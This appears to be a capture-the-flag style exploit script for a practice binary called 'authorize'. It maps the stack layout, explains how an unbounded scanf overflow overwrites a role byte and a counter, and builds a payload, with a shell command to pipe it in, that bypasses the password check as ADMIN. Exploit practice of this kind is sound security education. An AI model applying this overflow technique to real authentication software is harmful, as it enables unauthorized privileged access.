# Analyze the authorize binary: buffer overflow vulnerability
#
# Stack layout (from rbp):
#   rbp - 0x1030: name buffer (scanf %s)
#   rbp - 0x1024: role byte  (offset 0x0c = 12 from name start)
#   rbp - 0x101d: counter dword (offset 0x13 = 19 from name start)
#   rbp - 0x0019: password buffer (offset 0x1017 from name start)
#
# The program:
# 1. Reads name into buffer at rbp-0x1030
# 2. Reads password into buffer at rbp-0x19 (name+0x1017)
# 3. Checks role byte: must be 'U' (0x55) or 'A' (0x41)
# 4. Checks counter: must be 0 or 1 (if > 1 => "Hacking detected!")
# 5. If counter == 0 => "Invalid password!" (always happens without overflow)
# 6. If counter == 1 => copies 8 bytes from name[0x17] to name[0:8], then prints welcome
# 7. substr(dst=name, src=name+0x17, offset=0, length=8)
#
# The vulnerability: scanf("%s") with no bounds checking allows buffer overflow
# to overwrite role byte and counter.

# Exploit:
# Bytes 0-11:  padding (12 bytes)
# Byte 12:     role = 'A' (0x41) for ADMIN
# Bytes 13-18: padding (6 bytes)
# Bytes 19-22: counter = 0x00000001 (4 bytes, little endian)
# Bytes 23-30: 8 bytes that substr will copy to the start (for welcome message)

padding1 = b'A' * 12
role = b'\x41'  # 'A' for ADMIN, also works with 'U' for USER
padding2 = b'B' * 6
counter = b'\x01\x00\x00\x00'  # counter = 1
welcome_name = b'JASON' + b'\x00' * 3  # 8 bytes, null-padded

payload = padding1 + role + padding2 + counter + welcome_name
print(f"Payload length: {len(payload)}")
print(f"Payload hex: {payload.hex()}")
print(f"Payload repr: {payload}")

# Verify offsets
assert len(padding1) == 12
assert payload[12] == 0x41  # role at offset 12
assert payload[19:23] == b'\x01\x00\x00\x00'  # counter at offset 19
assert len(payload) >= 23 + 8  # at least 31 bytes for substr copy

print(f"\nTo exploit: echo '{payload.decode('latin-1')}' | ./authorize")
print("Or in python: p = b'...'; open('payload.txt','wb').write(p)")
